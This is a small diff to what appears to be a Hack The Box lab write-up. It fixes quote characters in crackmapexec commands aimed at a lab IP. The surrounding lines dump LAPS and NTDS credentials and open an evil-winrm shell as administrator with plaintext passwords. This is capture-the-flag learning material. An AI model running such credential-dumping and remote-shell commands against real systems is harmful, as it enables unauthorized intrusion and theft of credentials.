@@ -349,8 +349,8 @@ crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
 
 
 ```
-crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md’
-crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md’
+crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
+crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
 evil-winrm -i 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/cfe6f588-336c-4e66-aed7-ddb09f10b1d1)
